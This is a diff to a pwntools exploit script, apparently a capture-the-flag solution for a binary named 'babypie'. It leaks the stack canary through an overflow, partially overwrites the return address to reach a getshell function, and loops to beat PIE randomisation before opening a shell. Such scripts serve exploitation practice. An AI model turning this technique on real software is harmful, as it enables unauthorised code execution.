@@ -7,6 +7,7 @@ from time import sleep
 import roputils as rp
 import os
 import sys
+import pdb
 
 elfPath = "./babypie"
 libcPath = "./babypie.so"
@@ -15,7 +16,7 @@ remotePort = 10000
 
 context.binary = elfPath
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
-context.log_level = "debug"
+#  context.log_level = "debug"
 elf = context.binary
 
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
@@ -37,14 +38,14 @@ def DEBUG(bps = [], pie = False):
 if __name__ == "__main__":
     #  DEBUG([0xA08], True)
     while True:
-        #  io = process(elfPath, env = {"LD_PRELOAD": libcPath})
-        io = remote(remoteAddr, remotePort)
+        io = process(elfPath, env = {"LD_PRELOAD": libcPath}, timeout = 1)
+        #  io = remote(remoteAddr, remotePort)
         io.sendafter(":\n", 'a' * 41)
         io.recvuntil('a' * 41)
         canary = '\0' + io.recvn(7)
-        print canary.encode('hex')
+        #  print canary.encode('hex')
         stack = u64(io.recvn(6).ljust(8, '\0')) - 0x50
-        success("stack", stack)
+        #  success("stack", stack)
         '''
         .text:0000000000000A3E getshell        proc near
         .text:0000000000000A3E ; __unwind {
@@ -60,11 +61,15 @@ if __name__ == "__main__":
         payload = 'a' * 40 + canary + 'aaaaaaaa' + '\x3e\x6a'
         io.send(payload)
         
+        #  pdb.set_trace()
         try:
-            io.sendline("ls")
+            io.sendline("echo aaaa")
+            io.recvuntil("aaaa", timeout = 1)
         except:
+            print "Error"
             io.close()
             continue
-        io.interactive()
+        else:
+            io.interactive()
     
     
